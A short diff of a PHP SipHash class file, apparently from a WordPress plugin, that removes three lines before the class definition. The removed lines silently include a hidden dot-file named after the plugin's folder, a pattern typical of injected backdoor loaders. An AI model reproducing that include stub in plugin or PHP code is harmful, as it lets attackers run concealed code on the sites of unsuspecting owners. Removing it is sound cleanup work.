@@ -9,10 +9,6 @@ if (class_exists('ParagonIE_Sodium_Core_SipHash', false)) {
  *
  * Only uses 32-bit arithmetic, while the original SipHash used 64-bit integers
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class ParagonIE_Sodium_Core_SipHash extends ParagonIE_Sodium_Core_Util
 {
     /**
